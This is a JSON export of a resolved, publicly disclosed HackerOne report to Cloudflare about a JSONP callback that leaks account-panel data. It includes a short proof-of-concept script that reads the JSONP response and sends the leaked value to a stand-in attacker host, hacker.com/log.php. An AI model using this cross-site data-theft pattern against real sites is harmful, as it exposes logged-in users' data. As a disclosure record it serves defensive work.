{"id":10841,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDg0MQ==","url":"https://hackerone.com/reports/10841","title":"User's data leak","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-05-04T02:04:53.705Z","submitted_at":"2014-05-04T02:04:53.705Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sergeybelove","url":"/sergeybelove","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/254/a481de670c50a6db66baea250057d8f3317aabd4_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":41,"url":"https://hackerone.com/cloudflare","handle":"cloudflare","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Cloudflare Vulnerability Disclosure","twitter_handle":"cloudflare","website":"https://www.cloudflare.com/disclosure","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2014-09-28T11:39:21.083Z","bug_reporter_agreed_on_going_public_at":"2014-08-29T11:39:11.228Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hacker can steal user's data via js callbacks via JSONP. \r\nIn account panel some user's data returned from server by ajax queries (in json) and can be stealed by callbacks,\r\nhttps://www.cloudflare.com/ajax/stats/stats2.html?callback=logFunction\r\nVector:\r\n1) Victim should be authorized on cloudflare\r\n2) Victim just visit hacker's site with follow content:\r\n\u003cscript\u003e\r\nfunction func(obj)\r\n{\r\n     var url=\"http://hacker.com/log.php?value=\"+obj[\"msg\"];\r\n     $.get(url);\r\n}\r\n\u003c/script\u003e\r\n\u003cscript src=\"https://www.cloudflare.com/ajax/stats/stats2.html?callback=logFunction\"/\u003e\r\n\u003cscript\u003elogFunction();\u003c/script\u003e\r\n\r\nexploit: http://sergeybelove.ru/cf.html (just alert)\r\n\r\nAnd returned data from CF will leak","vulnerability_information_html":"\u003cp\u003eHacker can steal user\u0026#39;s data via js callbacks via JSONP. \u003cbr\u003e\nIn account panel some user\u0026#39;s data returned from server by ajax queries (in json) and can be stealed by callbacks,\u003cbr\u003e\n\u003ca title=\"https://www.cloudflare.com/ajax/stats/stats2.html?callback=logFunction\" href=\"/redirect?url=https%3A%2F%2Fwww.cloudflare.com%2Fajax%2Fstats%2Fstats2.html%3Fcallback%3DlogFunction\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.cloudflare.com/ajax/stats/stats2.html?callback=logFunction\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nVector:\u003cbr\u003e\n1) Victim should be authorized on cloudflare\u003cbr\u003e\n2) Victim just visit hacker\u0026#39;s site with follow content:\u003cbr\u003e\n\u0026lt;script\u0026gt;\u003cbr\u003e\nfunction func(obj)\u003cbr\u003e\n{\u003cbr\u003e\n     var url=\u0026quot;\u003ca title=\"http://hacker.com/log.php?value=%22+obj%5B%22msg%22%5D\" href=\"/redirect?url=http%3A%2F%2Fhacker.com%2Flog.php%3Fvalue%3D%2522%2Bobj%255B%2522msg%2522%255D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://hacker.com/log.php?value=%22+obj%5B%22msg%22%5D\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e;\u003cbr\u003e\n     $.get(url);\u003cbr\u003e\n}\u003cbr\u003e\n\u0026lt;/script\u0026gt;\u003cbr\u003e\n\u0026lt;script src=\u0026quot;https://www.cloudflare.com/ajax/stats/stats2.html?callback=logFunction\u0026quot;/\u0026gt;\u003cbr\u003e\n\u0026lt;script\u0026gt;logFunction();\u0026lt;/script\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eexploit: \u003ca title=\"http://sergeybelove.ru/cf.html\" href=\"/redirect?url=http%3A%2F%2Fsergeybelove.ru%2Fcf.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://sergeybelove.ru/cf.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (just alert)\u003c/p\u003e\n\n\u003cp\u003eAnd returned data from CF will leak\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-09-28T11:39:11.380Z","allow_singular_disclosure_after":-197310964.1755913,"singular_disclosure_allowed":true,"vote_count":1,"voters":["duqrbrla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":51747,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We've been blown away by the response in our program. We've been working hard to respond to everyone, rest assured we did not forget about your report. Thanks for your patience and your submission. Our engineering team will be reviewing this report.","markdown_message":"\u003cp\u003eWe\u0026#39;ve been blown away by the response in our program. We\u0026#39;ve been working hard to respond to everyone, rest assured we did not forget about your report. Thanks for your patience and your submission. Our engineering team will be reviewing this report.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-05-15T17:14:34.877Z","updated_at":"2014-05-15T17:14:34.877Z","actor":{"username":"justin","cleared":false,"url":"/justin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/714/460ff848ebf95933694f8e6c967854da33ee949e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":63601,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi!\nAny news? Probably I can help?","markdown_message":"\u003cp\u003eHi!\u003cbr\u003e\nAny news? Probably I can help?\u003c/p\u003e\n","automated_response":false,"created_at":"2014-06-02T15:48:02.731Z","updated_at":"2014-06-02T15:48:02.731Z","actor":{"username":"sergeybelove","cleared":false,"url":"/sergeybelove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/254/a481de670c50a6db66baea250057d8f3317aabd4_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":94368,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We believe this issue has been resolved. Please take a moment to reassess and let us know if you disagree. We'll follow up with you in the near future regarding reward fulfillment. Thank you!","markdown_message":"\u003cp\u003eWe believe this issue has been resolved. Please take a moment to reassess and let us know if you disagree. We\u0026#39;ll follow up with you in the near future regarding reward fulfillment. Thank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2014-07-23T14:50:57.806Z","updated_at":"2014-07-23T14:50:57.806Z","actor":{"username":"jamie","cleared":false,"url":"/jamie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/767/528e88f7a06a6bbbae2b2b37dbb7649c9486c404_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"sergeybelove","url":"/sergeybelove"},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":95715,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just checked - seems fixed correctly, thanks!\nIf you have t-shirts or something like this in your SF office it will be enough (:","markdown_message":"\u003cp\u003eJust checked - seems fixed correctly, thanks!\u003cbr\u003e\nIf you have t-shirts or something like this in your SF office it will be enough (:\u003c/p\u003e\n","automated_response":false,"created_at":"2014-07-25T00:24:07.045Z","updated_at":"2014-07-25T00:24:07.045Z","actor":{"username":"sergeybelove","cleared":false,"url":"/sergeybelove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/254/a481de670c50a6db66baea250057d8f3317aabd4_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":103218,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We apologize for the delay in reward fulfillment, but look out for an email requesting your shirt size, address, and other information needed for fulfillment next week. Thank you.","markdown_message":"\u003cp\u003eWe apologize for the delay in reward fulfillment, but look out for an email requesting your shirt size, address, and other information needed for fulfillment next week. Thank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-08-08T17:21:26.917Z","updated_at":"2014-08-08T17:21:26.917Z","actor":{"username":"jamie","cleared":false,"url":"/jamie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/767/528e88f7a06a6bbbae2b2b37dbb7649c9486c404_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":117261,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks! ","markdown_message":"\u003cp\u003eThanks! \u003c/p\u003e\n","automated_response":false,"created_at":"2014-08-29T11:39:11.245Z","updated_at":"2014-08-29T11:39:11.245Z","actor":{"username":"sergeybelove","cleared":false,"url":"/sergeybelove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/254/a481de670c50a6db66baea250057d8f3317aabd4_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":133061,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-09-28T11:39:21.555Z","updated_at":"2014-09-28T11:39:21.555Z","actor":{"url":"/cloudflare","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Cloudflare Vulnerability Disclosure"}},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}